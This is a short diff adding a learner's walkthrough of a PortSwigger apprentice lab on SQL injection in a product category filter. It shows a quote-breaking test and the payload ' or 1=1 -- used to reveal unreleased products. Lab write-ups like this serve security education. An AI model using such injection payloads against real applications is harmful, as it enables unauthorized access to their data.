@@ -1,0 +1,23 @@
+1. Trying an SQL injection.
+
+Source: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
+
+Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+APPRENTICE
+
+This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
+
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.
+
+
+1. Let's try this SQL injection by adding our payload in the parametrized query:
+SELECT * FROM products WHERE category = ''' AND released = 1
+Result: Internal Server Error (this error means that our injection broke the logic of the server, so we'll try
+some other tricks).
+
+2. SELECT * FROM products WHERE category = ''--' AND released = 1
+Here we are adding the '-- after the string ...category=
+
+3. This time we'll try this:
+SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1 (validate if empty or true [1=1])
